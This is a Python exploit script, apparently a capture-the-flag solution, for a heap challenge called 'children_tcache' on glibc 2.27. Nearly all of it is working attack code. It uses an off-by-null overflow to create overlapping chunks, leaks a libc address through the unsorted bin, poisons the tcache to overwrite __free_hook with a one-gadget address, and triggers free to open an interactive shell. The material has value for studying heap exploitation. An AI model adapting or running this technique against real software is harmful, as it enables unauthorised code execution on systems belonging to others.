# File: exp.py
# Author: raycp
# Date: 2019-06-03
# Description: exp for children_tcache,unlink to form overlap chunk by off-by-null vuln


from pwn_debug import *


pdbg=pwn_debug("./children_tcache")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.27.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def new(size,content):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(content)


def show(idx):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(idx))


def delete(idx):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(idx))

def pwn():

    ## chunk with size bigger than 0x400 will be put into unsorted bin directly.
    
    #pdbg.bp()
    
    new(0x410,'a') #0
    new(0x88,'a') #1
    new(0x4f0,'b') #2
    new(0x88,'b') #3
    delete(0)
    delete(1)
    #pdbg.bp(0xd6b)
    #new(0x88,'a'*0x88) #0
    
    for i in range(0,9):
        #delete(0)
        new(0x88-i,'a'*(0x88-i))
        delete(0)
    #pdbg.bp(0xd6b)
    ## fake prev size will be 0x420+0x90
    new(0x88,'a'*0x80+p64(0x420+0x90)) #0
    delete(2)  # merge with chunk 0x420
    
    new(0x410,'a') #1
    #pdbg.bp(0xec1)
    show(0)
    unsorted_addr=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))
    #libc_base=unsorted_addr-libc.symbols['main_arena']-0x60
    libc_base=unsorted_addr-0x3ebca0
    free_hook=libc_base+libc.symbols['__free_hook']
    rce=libc_base+0x4f322 
    log.info("leak libc base: %s"%(hex(libc_base)))

    new(0x88,'a') #2   the same chunk with 0

    # tcache attack.
    delete(0)
    delete(2)

    pdbg.bp(command=['b *%s'%(hex(rce))])
    new(0x88,p64(free_hook)) #4
    new(0x88,'a')
    new(0x88,p64(rce))

    # trigger free
    delete(1)
    p.interactive() 

if __name__ == '__main__':
   pwn()


